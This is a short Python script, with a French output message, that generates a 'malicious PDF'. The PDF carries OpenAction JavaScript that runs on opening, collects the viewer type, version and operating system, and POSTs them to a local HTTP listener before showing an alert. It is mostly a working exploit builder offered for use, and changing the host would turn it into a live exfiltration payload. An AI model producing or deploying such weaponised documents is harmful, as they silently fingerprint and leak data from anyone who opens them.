def create_malicious_pdf(output_filename):
    pdf_code = f"""%PDF-1.5
1 0 obj
<<
    /Type /Catalog
    /Pages 2 0 R
    /OpenAction << /S /JavaScript /JS (
        var info = 'User-Agent: ' + app.viewerType + ' ' + app.viewerVersion + '\\nOS: ' + platformName; 
        var req = new Net.HTTP();
        req.open("POST", "http://127.0.0.1:5999", false);
        req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        req.write("data=' + encodeURIComponent(info) + '");
        req.close();
        app.alert('JavaScript Executed!');
    ) >>
>>
endobj
2 0 obj
<<
    /Type /Pages
    /Kids [3 0 R]
    /Count 1
>>
endobj
3 0 obj
<<
    /Type /Page
    /Parent 2 0 R
    /MediaBox [0 0 612 792]
    /Contents 4 0 R
    /Resources << >>
>>
endobj
4 0 obj
<< /Length 44 >>
stream
BT /F1 24 Tf 100 700 Td (Test PDF with JavaScript) Tj ET
endstream
endobj
xref
0 5
0000000000 65535 f 
0000000010 00000 n 
0000000079 00000 n 
0000000172 00000 n 
0000000260 00000 n 
trailer
<<
    /Size 5
    /Root 1 0 R
>>
startxref
311
%%EOF"""

    with open(output_filename, "wb") as f:
        f.write(pdf_code.encode("utf-8"))

    print(f"PDF '{output_filename}' généré avec succès.")

if __name__ == "__main__":
    create_malicious_pdf("requested.pdf")
